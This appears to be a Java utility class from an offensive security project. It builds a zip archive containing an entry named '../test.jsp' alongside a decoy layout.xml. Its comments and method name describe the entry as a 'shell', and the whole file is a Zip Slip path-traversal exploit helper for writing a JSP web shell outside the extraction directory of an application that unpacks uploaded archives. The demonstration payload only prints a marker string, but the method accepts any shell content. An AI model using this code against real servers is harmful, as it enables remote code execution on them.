package com.akkacloud.utils;

import com.sun.deploy.util.StringUtils;

import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZIPUtil {

    /**
     *
     * @param shellContent shell的文件内容
     * @param shellname shell的文件名
     * @param zipFileName 压缩文件的名字，要加上绝对路径/tmp/1.zip
     * @throws IOException
     */
    public static void writeShellZip(String shellContent,String shellname,String zipFileName) throws IOException {
        String str2 = "";
        String Name2 = "layout.xml";  //在压缩包里创建file目录下的文件
        //创建压缩包
        ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zipFileName));
        //创建压缩包里的文件
        zipOutputStream.putNextEntry(new ZipEntry(shellname));
        byte[] bytes1 = shellContent.getBytes(StandardCharsets.UTF_8);
        zipOutputStream.write(bytes1, 0, bytes1.length);    //将数据写入到压缩包里的文件里面
        zipOutputStream.closeEntry();

        zipOutputStream.putNextEntry(new ZipEntry(Name2));
        byte[] bytes2 = str2.getBytes(StandardCharsets.UTF_8);
        zipOutputStream.write(bytes2, 0, bytes2.length);

        zipOutputStream.closeEntry();
        zipOutputStream.flush();
        zipOutputStream.close();
    }

    public static void main(String[] args) throws IOException {
        String zipFileName = "/Users/akka/Desktop/3.zip";      //压缩包绝对路径
        String shellname = "../test.jsp";      //压缩包里的文件
        String shellContent = "<%out.println(\"123123123\");%>"; //需要写入的数据
        writeShellZip(shellContent, shellname, zipFileName);
    }

}
